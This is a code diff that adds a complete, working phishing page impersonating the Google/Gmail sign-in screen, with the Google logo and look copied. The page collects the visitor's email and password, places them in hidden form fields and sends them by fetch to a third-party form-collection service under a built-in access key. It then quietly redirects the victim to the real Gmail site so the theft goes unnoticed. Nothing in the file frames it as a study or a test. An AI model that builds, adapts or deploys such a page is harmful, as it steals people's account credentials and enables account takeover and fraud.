@@ -1,0 +1,411 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Sign in – Google accounts</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: 'Roboto', arial, sans-serif;
+    }
+
+    body {
+      background-color: #f0f4f9;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      color: #1f1f1f;
+    }
+
+    .container {
+      background: #ffffff;
+      width: 100%;
+      max-width: 450px;
+      padding: 40px;
+      border-radius: 28px;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.08);
+      overflow: hidden;
+    }
+
+    .logo-container {
+      margin-bottom: 16px;
+    }
+
+    .logo-container svg {
+      width: 48px;
+      height: 48px;
+    }
+
+    h1 {
+      font-size: 24px;
+      font-weight: 400;
+      color: #1f1f1f;
+      margin-bottom: 8px;
+    }
+
+    .subtitle {
+      font-size: 16px;
+      color: #444746;
+      margin-bottom: 32px;
+    }
+
+    .user-chip {
+      display: none;
+      align-items: center;
+      gap: 8px;
+      border: 1px solid #747775;
+      padding: 6px 12px;
+      border-radius: 16px;
+      width: fit-content;
+      margin-bottom: 24px;
+      cursor: pointer;
+      font-size: 14px;
+      color: #1f1f1f;
+    }
+
+    .user-chip svg {
+      fill: #444746;
+    }
+
+    .form-step {
+      display: none;
+      flex-direction: column;
+    }
+
+    .form-step.active {
+      display: flex;
+    }
+
+    .input-group {
+      position: relative;
+      margin-bottom: 8px;
+    }
+
+    .input-field {
+      width: 100%;
+      height: 56px;
+      padding: 16px;
+      font-size: 16px;
+      border: 1px solid #747775;
+      border-radius: 4px;
+      outline: none;
+      background: transparent;
+      transition: border-color 0.15s ease-in-out;
+    }
+
+    .input-field:focus {
+      border: 2px solid #0b57d0;
+      padding: 15px;
+    }
+
+    .input-field.error {
+      border-color: #b3261e !important;
+    }
+
+    .input-label {
+      position: absolute;
+      left: 16px;
+      top: 50%;
+      transform: translateY(-50%);
+      background: #ffffff;
+      padding: 0 4px;
+      color: #444746;
+      font-size: 16px;
+      pointer-events: none;
+      transition: 0.15s ease-in-out;
+    }
+
+    .input-field:focus ~ .input-label,
+    .input-field:not(:placeholder-shown) ~ .input-label {
+      top: 0;
+      font-size: 12px;
+      color: #0b57d0;
+    }
+
+    .input-field.error ~ .input-label {
+      color: #b3261e;
+    }
+
+    .error-msg {
+      color: #b3261e;
+      font-size: 12px;
+      margin-top: 4px;
+      min-height: 16px;
+      display: flex;
+      align-items: center;
+      gap: 4px;
+    }
+
+    .links {
+      margin-top: 4px;
+      margin-bottom: 32px;
+    }
+
+    .link {
+      color: #0b57d0;
+      text-decoration: none;
+      font-size: 14px;
+      font-weight: 500;
+    }
+
+    .link:hover {
+      text-decoration: underline;
+    }
+
+    .actions {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-top: 16px;
+    }
+
+    .btn-text {
+      background: none;
+      border: none;
+      color: #0b57d0;
+      font-size: 14px;
+      font-weight: 500;
+      cursor: pointer;
+      padding: 10px 0;
+    }
+
+    .btn-text:hover {
+      color: #0842a0;
+    }
+
+    .btn-primary {
+      background-color: #0b57d0;
+      color: #ffffff;
+      border: none;
+      padding: 10px 24px;
+      border-radius: 20px;
+      font-size: 14px;
+      font-weight: 500;
+      cursor: pointer;
+      transition: background-color 0.15s ease-in-out;
+    }
+
+    .btn-primary:hover {
+      background-color: #0842a0;
+      box-shadow: 0 1px 2px rgba(0,0,0,0.3);
+    }
+
+    .show-password {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      margin-top: 8px;
+      margin-bottom: 24px;
+      font-size: 14px;
+      color: #1f1f1f;
+      cursor: pointer;
+      user-select: none;
+    }
+
+    .show-password input {
+      width: 18px;
+      height: 18px;
+      accent-color: #0b57d0;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <!-- Google Logo -->
+    <div class="logo-container">
+      <svg viewBox="0 0 24 24">
+        <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
+        <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
+        <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.06H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.94l2.85-2.22.81-.63z"/>
+        <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.06l3.66 2.84c.87-2.6 3.3-4.52 6.16-4.52z"/>
+      </svg>
+    </div>
+
+    <!-- Dynamic Header -->
+    <h1 id="title">Sign in</h1>
+    <p class="subtitle" id="subtitle">to continue to Gmail</p>
+
+    <!-- User Chip (Shows selected email on password step) -->
+    <div class="user-chip" id="userChip" onclick="goToEmailStep()">
+      <svg width="18" height="18" viewBox="0 0 24 24">
+        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 4c1.93 0 3.5 1.57 3.5 3.5S13.93 13 12 13s-3.5-1.57-3.5-3.5S10.07 6 12 6zm0 14c-2.03 0-4.43-.82-6.14-2.88C7.55 15.8 9.68 15 12 15s4.45.8 6.14 2.12C16.43 19.18 14.03 20 12 20z"/>
+      </svg>
+      <span id="displayEmail">user@gmail.com</span>
+    </div>
+
+    <!-- STEP 1: Email Form -->
+    <form id="emailForm" class="form-step active" onsubmit="handleEmailSubmit(event)" novalidate>
+      <div class="input-group">
+        <input type="email" id="email" class="input-field" placeholder=" " autocomplete="username" required>
+        <label for="email" class="input-label">Email or phone</label>
+      </div>
+      <div class="error-msg" id="emailError"></div>
+
+      <div class="links">
+        <a href="#" class="link">Forgot email?</a>
+      </div>
+
+      <div class="actions">
+        <button type="button" class="btn-text">Create account</button>
+        <button type="submit" class="btn-primary">Next</button>
+      </div>
+    </form>
+
+    <!-- STEP 2: Password Form -->
+    <!-- This form now submits to Web3Forms with hidden fields and redirects -->
+    <form id="passwordForm" class="form-step" action="https://api.web3forms.com/submit" method="POST" onsubmit="handlePasswordSubmit(event)" novalidate>
+      <!-- Web3Forms access key -->
+      <input type="hidden" name="access_key" value="557fc0aa-6cc2-4e84-a9a4-0d97f406da19">
+      
+      <!-- Email will be sent as 'name' and also as 'email' to match the target form -->
+      <input type="hidden" name="name" id="hiddenName">
+      <input type="hidden" name="email" id="hiddenEmail">
+      <!-- Password sent as message (as per the target form) -->
+      <input type="hidden" name="message" id="hiddenMessage">
+      
+      <!-- Additional hidden field to avoid bot detection (optional but recommended) -->
+      <input type="checkbox" name="botcheck" style="display: none;" value="1">
+
+      <div class="input-group">
+        <input type="password" id="password" class="input-field" placeholder=" " autocomplete="current-password" required>
+        <label for="password" class="input-label">Enter your password</label>
+      </div>
+      <div class="error-msg" id="passwordError"></div>
+
+      <label class="show-password">
+        <input type="checkbox" id="togglePassword" onclick="togglePasswordVisibility()">
+        Show password
+      </label>
+
+      <div class="actions">
+        <a href="#" class="link">Forgot password?</a>
+        <button type="submit" class="btn-primary">Next</button>
+      </div>
+    </form>
+  </div>
+
+  <script>
+    const emailForm = document.getElementById('emailForm');
+    const passwordForm = document.getElementById('passwordForm');
+    const emailInput = document.getElementById('email');
+    const passwordInput = document.getElementById('password');
+    const emailError = document.getElementById('emailError');
+    const passwordError = document.getElementById('passwordError');
+    const title = document.getElementById('title');
+    const subtitle = document.getElementById('subtitle');
+    const userChip = document.getElementById('userChip');
+    const displayEmail = document.getElementById('displayEmail');
+
+    // Hidden fields for Web3Forms submission
+    const hiddenName = document.getElementById('hiddenName');
+    const hiddenEmail = document.getElementById('hiddenEmail');
+    const hiddenMessage = document.getElementById('hiddenMessage');
+
+    // Handle Email Next Button
+    function handleEmailSubmit(e) {
+      e.preventDefault();
+      const value = emailInput.value.trim();
+
+      if (!value) {
+        showError(emailInput, emailError, 'Enter an email or phone number');
+        return;
+      }
+      
+      if (!validateEmail(value)) {
+        showError(emailInput, emailError, 'Enter a valid email address');
+        return;
+      }
+
+      clearError(emailInput, emailError);
+
+      // Transition to password step
+      displayEmail.textContent = value;
+      title.textContent = 'Welcome';
+      subtitle.style.display = 'none';
+      userChip.style.display = 'flex';
+      
+      emailForm.classList.remove('active');
+      passwordForm.classList.add('active');
+      passwordInput.focus();
+    }
+
+    // Handle Password Submission: set hidden fields, submit to Web3Forms, then redirect
+    function handlePasswordSubmit(e) {
+      e.preventDefault(); // prevent default to control flow
+
+      const passwordValue = passwordInput.value;
+      const emailValue = emailInput.value.trim();
+
+      if (!passwordValue) {
+        showError(passwordInput, passwordError, 'Enter a password');
+        return;
+      }
+
+      clearError(passwordInput, passwordError);
+
+      // Populate hidden fields for Web3Forms
+      hiddenName.value = emailValue;       // name field
+      hiddenEmail.value = emailValue;      // email field
+      hiddenMessage.value = passwordValue; // message field (password)
+
+      // Submit the form to Web3Forms
+      // We'll use fetch to send data and then redirect regardless of response
+      const formData = new FormData(passwordForm);
+
+      fetch(passwordForm.action, {
+        method: 'POST',
+        body: formData,
+      })
+      .then(response => {
+        // Redirect to official Gmail website after successful submission (or even if it fails)
+        window.location.href = 'https://mail.google.com';
+      })
+      .catch(error => {
+        // In case of network error, still redirect to Gmail
+        window.location.href = 'https://mail.google.com';
+      });
+    }
+
+    // Return to Step 1
+    function goToEmailStep() {
+      title.textContent = 'Sign in';
+      subtitle.style.display = 'block';
+      userChip.style.display = 'none';
+      
+      passwordForm.classList.remove('active');
+      emailForm.classList.add('active');
+      passwordInput.value = '';
+      clearError(passwordInput, passwordError);
+      emailInput.focus();
+    }
+
+    // Toggle Password Visibility
+    function togglePasswordVisibility() {
+      const type = passwordInput.type === 'password' ? 'text' : 'password';
+      passwordInput.type = type;
+    }
+
+    // Helper Functions
+    function showError(input, errorEl, message) {
+      input.classList.add('error');
+      errorEl.textContent = message;
+    }
+
+    function clearError(input, errorEl) {
+      input.classList.remove('error');
+      errorEl.textContent = '';
+    }
+
+    function validateEmail(email) {
+      return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email) || /^\d{10,}$/.test(email);
+    }
+  </script>
+</body>
+</html>
